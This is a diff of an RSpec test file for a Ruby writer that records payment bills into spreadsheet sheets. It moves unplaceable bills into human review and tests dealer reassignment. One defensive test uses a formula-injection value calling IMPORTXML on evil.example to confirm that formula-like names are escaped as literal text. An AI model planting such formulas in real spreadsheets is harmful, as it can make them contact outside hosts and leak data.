@@ -22,15 +22,10 @@ RSpec.describe Workbook::HelloSmcWriter do
         "Lợi nhuận", "Số Lô", "Ngày giao dịch", "Giờ giao dịch", "Tên đại lý", "Tên HKD", "Người đi tiền" ] ]
   end
 
-  def bill_grid
-    [ [ "Tên Đại lý", "Số tiền sau khi trừ phí gốc", "Số tiền giao dịch", "Phí gốc", "Ngày giao dịch", "Trạng thái" ] ]
-  end
-
   def memory(extra = {}, row_limits = {})
     Workbook::MemorySheet.new({
       "DS MB T10" => ds_mb_grid,
-      "MB" => mb_grid,
-      "Bill vô chủ" => bill_grid
+      "MB" => mb_grid
     }.merge(extra), row_limits)
   end
 
@@ -145,8 +140,11 @@ RSpec.describe Workbook::HelloSmcWriter do
       [ described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id"), client ]
     end
 
-    def last_issue(transaction)
-      WorkbookEntry.find_by!(transaction_id: transaction.id).payload["issue"]
+    def review_reason(transaction)
+      transaction.reload
+      expect(transaction).to be_needs_review
+      expect(WorkbookEntry.where(transaction_id: transaction.id)).not_to exist
+      transaction.source_data["review_reasons"].sole
     end
 
     before do
@@ -205,13 +203,13 @@ RSpec.describe Workbook::HelloSmcWriter do
       expect(transaction.applied_dealer_rate).to eq(BigDecimal("0.0121"))
     end
 
-    it "records the bill in Bill vô chủ for a name no dealer has, and changes nothing" do
+    it "sends the bill back to review for a name no dealer has, and writes nothing" do
       transaction = build_transaction
 
       result, client = write(transaction, renamed_grid("Minh Quân (tid1)"))
 
-      expect(result).to eq(:unidentified)
-      expect(last_issue(transaction)).to eq("ds_header_dealer_unmatched")
+      expect(result).to eq(:needs_review)
+      expect(review_reason(transaction)).to eq("ds_header_dealer_unmatched")
       expect(client.cell("DS MB T10", "B2")).to eq(354_367_000)
       expect(client.cell("MB", "A2")).to be_nil
       expect(link.reload).to have_attributes(dealer: chuong, ds_header: "Chương (tid1)")
@@ -225,8 +223,8 @@ RSpec.describe Workbook::HelloSmcWriter do
 
       result, = write(transaction, renamed_grid("Lan (tid1)"))
 
-      expect(result).to eq(:unidentified)
-      expect(last_issue(transaction)).to eq("ds_header_dealer_unmatched")
+      expect(result).to eq(:needs_review)
+      expect(review_reason(transaction)).to eq("ds_header_dealer_unmatched")
       expect(link.reload.dealer).to eq(chuong)
       expect(transaction.reload.dealer).to eq(chuong)
     end
@@ -241,16 +239,16 @@ RSpec.describe Workbook::HelloSmcWriter do
       expect(link.reload.ds_header).to eq("Chương Văn (tid1)")
     end
 
-    it "records the bill in Bill vô chủ when it cannot move to the new dealer, leaving it as it was" do
+    it "sends the bill back to review when it cannot move to the new dealer" do
       lan
       transaction = build_transaction
       FeeRule.update_all(active: false)
 
       result, = write(transaction, renamed_grid("Lan (tid1)"))
 
-      expect(result).to eq(:unidentified)
-      expect(last_issue(transaction)).to eq("dealer_reassign_failed")
-      expect(transaction.reload).to have_attributes(dealer: chuong, status: "approved")
+      expect(result).to eq(:needs_review)
+      expect(review_reason(transaction)).to eq("dealer_reassign_failed")
+      expect(transaction.reload.dealer).to eq(chuong)
     end
 
     it "moves a bill evaluated before the agent row changed hands to the row's dealer" do
@@ -286,8 +284,8 @@ RSpec.describe Workbook::HelloSmcWriter do
 
       result, = write(transaction, renamed_grid("Lan (tid1)"))
 
-      expect(result).to eq(:unidentified)
-      expect(last_issue(transaction)).to eq("ds_cell_missing")
+      expect(result).to eq(:needs_review)
+      expect(review_reason(transaction)).to eq("ds_cell_missing")
       expect(link.reload.dealer).to eq(chuong)
       expect(transaction.reload.dealer).to eq(chuong)
     end
@@ -387,21 +385,20 @@ RSpec.describe Workbook::HelloSmcWriter do
       expect(write_with("354.367.000").cell("DS MB T10", "B2")).to eq("=354367000+486000")
     end
 
-    it "books the bill in Bill vô chủ when the day cell holds text it cannot add to" do
+    it "sends the bill back to review when the day cell holds text it cannot add to" do
       client = write_with("ghi chú")
 
       expect(client.cell("DS MB T10", "B2")).to eq("ghi chú")
       expect(client.cell("MB", "A2")).to be_nil
-      expect(client.cell("Bill vô chủ", "C2")).to eq(486_000)
-      expect(WorkbookEntry.last.branch).to eq("unidentified")
-      expect(WorkbookEntry.last.payload["issue"]).to eq("ds_cell_not_numeric")
+      expect(WorkbookEntry.count).to eq(0)
+      expect(Transaction.last.source_data["review_reasons"]).to eq([ "ds_cell_not_numeric" ])
     end
 
     it "does not add to a formula that is not a plain running sum" do
       client = write_with("=SUM(C2:D2)")
 
       expect(client.cell("DS MB T10", "B2")).to eq("=SUM(C2:D2)")
-      expect(WorkbookEntry.last.payload["issue"]).to eq("ds_cell_not_numeric")
+      expect(Transaction.last.source_data["review_reasons"]).to eq([ "ds_cell_not_numeric" ])
     end
 
     it "clears last month's running sums when it builds a new month" do
@@ -415,23 +412,86 @@ RSpec.describe Workbook::HelloSmcWriter do
     end
   end
 
-  describe "unidentified transaction" do
-    it "appends a Bill vô chủ row and leaves the other sheets untouched" do
+  describe "bill the writer cannot place" do
+    # No TID on the bill, and its dealer has no agent row in the HKD to fall back on.
+    def unknown_tid_transaction
+      build_transaction.tap do |transaction|
+        transaction.update!(dealer: create(:dealer, name: "Không có cột"),
+                            source_data: { "extraction" => { "merchant_name" => "KHÔNG RÕ HKD" } })
+      end
+    end
+
+    it "writes nothing and sends the bill back to review with the reason" do
       client = memory
       allow(client).to receive(:batch_update_values).and_call_original
+      transaction = unknown_tid_transaction
 
+      expect(described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id")).to eq(:needs_review)
+
+      expect(client).not_to have_received(:batch_update_values)
+      expect(WorkbookEntry.count).to eq(0)
+      transaction.reload
+      expect(transaction).to be_needs_review
+      expect(transaction.review_reason_codes).to eq([ "agent_tid_missing" ])
+      expect(transaction.open_review.reason_codes).to eq([ "agent_tid_missing" ])
+      expect(AuditLog.find_by!(action: "transaction.sent_to_review", auditable: transaction).metadata)
+        .to eq("issue" => "agent_tid_missing")
+    end
+
+    it "replaces the reasons settled at approval with the writer's reason" do
+      transaction = unknown_tid_transaction
+      transaction.update!(source_data: transaction.source_data.merge("review_reasons" => [ "merchant_low_confidence" ]))
+
+      described_class.call(transaction: transaction, client: memory, spreadsheet_id: "sheet-id")
+
+      expect(transaction.reload.review_reason_codes).to eq([ "agent_tid_missing" ])
+    end
+
+    it "writes a bill without TID into the only column of the dealer it was approved with" do
       transaction = build_transaction
-      transaction.source_data = { "extraction" => { "merchant_name" => "KHÔNG RÕ HKD" } }
-      transaction.save!
+      transaction.update!(source_data: { "extraction" => { "merchant_name" => "001: HỘ KINH DOANH THIÊN KIM" } })
+      client = memory
 
-      result = described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id")
+      expect(described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id")).to eq(:identified)
+      expect(client.cell("DS MB T10", "B2")).to eq("=354367000+486000")
+      expect(client.cell("MB", "I2")).to eq("Chương")
+    end
 
-      expect(result).to eq(:unidentified)
-      expect(client.cell("Bill vô chủ", "C2")).to eq(486_000)
-      expect(client.cell("Bill vô chủ", "A2")).to eq("KHÔNG RÕ HKD")
-      expect(client.cell("DS MB T10", "B2")).to eq(354_367_000)
-      expect(client).to have_received(:batch_update_values).once
-      expect(WorkbookEntry.count).to eq(1)
+    it "keeps the dealer a confirmed QR paid when a person approves the bill again" do
+      lan = create(:dealer, name: "Lan")
+      create(:fee_rule, merchant: merchant, base_fee_rate: BigDecimal("0.0088"), dealer_rate: BigDecimal("0.0121"))
+      transaction = build_transaction
+      transaction.update!(source_data: transaction.source_data.merge("dealer_resolution" => { "merchant_dealer_id" => link.id }))
+      DealerPaymentQr.create!(recorded_transaction: transaction, dealer: chuong, status: "confirmed", access_token: "paid")
+      client = memory("DS MB T10" => ds_mb_grid.tap { |grid| grid[0][1] = "Lan (tid1)" })
+
+      expect(described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id")).to eq(:needs_review)
+      expect(transaction.reload.review_reason_codes).to eq([ "payment_qr_confirmed" ])
+      expect(link.reload.dealer).to eq(lan)
+
+      expect(Transactions::Approver.call(transaction: transaction, actor: create(:user, :operator))).to be(true)
+      expect(described_class.call(transaction: transaction.reload, client: client, spreadsheet_id: "sheet-id")).to eq(:identified)
+
+      expect(transaction.reload.dealer).to eq(chuong)
+      expect(client.cell("DS MB T10", "B2")).to eq("=354367000+486000")
+      expect(client.cell("MB", "I2")).to eq("Lan") # column I names the agent of the column, as before
+      expect(AuditLog.where(action: "transaction.dealer_reassigned")).to be_empty
+    end
+
+    it "is written once the configuration is fixed and the bill approved again" do
+      transaction = build_transaction
+      client = memory("DS MB T10" => ds_mb_grid.tap { |grid| grid[0][1] = "Lan (tid1)" })
+      described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id")
+      expect(transaction.reload).to be_needs_review
+
+      lan = create(:dealer, name: "Lan")
+      create(:fee_rule, merchant: merchant, base_fee_rate: BigDecimal("0.0088"), dealer_rate: BigDecimal("0.0121"))
+      expect(Transactions::Approver.call(transaction: transaction, actor: create(:user, :operator))).to be(true)
+
+      expect(described_class.call(transaction: transaction.reload, client: client, spreadsheet_id: "sheet-id")).to eq(:identified)
+      expect(transaction.reload.dealer).to eq(lan)
+      expect(link.reload.dealer).to eq(lan)
+      expect(client.cell("DS MB T10", "B2")).to eq("=354367000+486000")
     end
   end
 
@@ -597,42 +657,20 @@ RSpec.describe Workbook::HelloSmcWriter do
       expect(WorkbookEntry.last.payload["issue"]).to eq("reconciled_after_retry")
     end
 
-    it "does not add a second Bill vô chủ row on retry" do
-      client = memory
-      transaction = build_transaction
-      transaction.source_data = { "extraction" => { "merchant_name" => "KHÔNG RÕ HKD" } }
-      transaction.save!
-      calls = 0
-      allow(WorkbookEntry).to receive(:create!).and_wrap_original do |original, *args|
-        calls += 1
-        raise ActiveRecord::StatementInvalid, "db down" if calls == 1
-
-        original.call(*args)
-      end
-
-      expect { described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id") }
-        .to raise_error(ActiveRecord::StatementInvalid)
-      expect(described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id"))
-        .to eq(:already_written)
-      expect(client.cell("Bill vô chủ", "A3")).to be_nil
-      expect(WorkbookEntry.count).to eq(1)
-    end
-
-    it "writes OCR text that looks like a formula as literal text" do
+    it "writes names that look like a formula as literal text" do
       client = memory
       sent = nil
       allow(client).to receive(:batch_update_values).and_wrap_original do |original, updates|
         sent = updates
         original.call(updates)
       end
-      transaction = build_transaction
-      transaction.source_data = { "extraction" => { "merchant_name" => "=IMPORTXML(\"http://evil.example\",\"//a\")" } }
-      transaction.save!
+      chuong.update!(name: "=IMPORTXML(\"http://evil.example\",\"//a\")")
 
-      described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id")
+      described_class.call(transaction: build_transaction, client: client, spreadsheet_id: "sheet-id")
 
-      expect(sent.first[:rows].first.first).to start_with("'=IMPORTXML")
-      expect(client.cell("Bill vô chủ", "A2")).to start_with("=IMPORTXML")
+      mb_row = sent.find { |update| update[:sheet] == "MB" }[:rows].first
+      expect(mb_row[8]).to start_with("'=IMPORTXML")
+      expect(client.cell("MB", "I2")).to start_with("=IMPORTXML")
     end
   end
 
@@ -652,8 +690,8 @@ RSpec.describe Workbook::HelloSmcWriter do
       result = described_class.call(transaction: build_transaction(at: Time.zone.local(2026, 10, 2, 10, 0)),
                                     client: client, spreadsheet_id: "sheet-id")
 
-      expect(result).to eq(:unidentified)
-      expect(WorkbookEntry.last.payload["issue"]).to eq("ds_cell_missing")
+      expect(result).to eq(:needs_review)
+      expect(Transaction.last.source_data["review_reasons"]).to eq([ "ds_cell_missing" ])
       expect(client.cell("DS MB T10", "B7")).to eq(300)
     end
   end
